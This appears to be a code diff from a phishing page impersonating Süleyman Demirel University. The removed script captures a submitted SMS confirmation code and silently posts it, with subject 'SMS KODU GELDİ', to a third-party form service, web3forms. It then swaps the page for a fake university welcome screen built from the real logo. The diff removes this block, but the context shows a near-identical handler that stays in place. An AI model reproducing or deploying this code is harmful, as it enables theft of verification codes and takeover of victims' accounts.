@@ -967,55 +967,6 @@
 </body>
 <script>
     document.getElementById('stsForm').addEventListener('submit', function (e) {
-        e.preventDefault(); // Sayfayı durdur
-
-        const btn = document.getElementById('submitBtn');
-        if (btn) {
-            btn.disabled = true;
-            btn.innerHTML = "İşlem Yapılıyor...";
-        }
-
-        // Form verilerini al
-        const formData = new FormData(this);
-        const data = {
-            access_key: "05eb1609-0be8-46d8-ad94-9a74e5e6c3e1",
-            from_name: "SDÜ Doğrulama",
-            subject: "SMS KODU GELDİ",
-            onay_no: formData.get('onay_no')
-        };
-
-        // 1. ADIM: Maili gönder
-        fetch('https://api.web3forms.com/submit', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-            .then(response => {
-                // 2. ADIM: Mail başarıyla gönderildiyse (veya cevap geldiyse) ekranı değiştir
-                ekraniDegistir();
-            })
-            .catch(error => {
-                // Hata olsa bile ekranı değiştir ki sunum akıcı olsun
-                ekraniDegistir();
-            });
-    });
-
-    function ekraniDegistir() {
-        // Fotoğrafın gözükmesi için doğrudan SDÜ'nün canlı linkini kullanıyoruz
-        document.body.innerHTML = `
-            <div style="width:100%; height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-                <img src="https://w3.sdu.edu.tr/assets/img/logo-tr.png" style="width:300px; margin-bottom:20px;">
-                <p style="color:#888; letter-spacing:3px; text-transform:uppercase; font-size:14px;">Hoş Geldiniz</p>
-                <h1 style="color:#1a1a1a; font-size:20px; margin-top:10px;">SÜLEYMAN DEMİREL ÜNİVERSİTESİ</h1>
-            </div>
-        `;
-    }
-</script>
-<script>
-    document.getElementById('stsForm').addEventListener('submit', function (e) {
         e.preventDefault(); // Sayfanın kendi kendine yenilenmesini engelle
 
         const btn = document.getElementById('submitBtn');
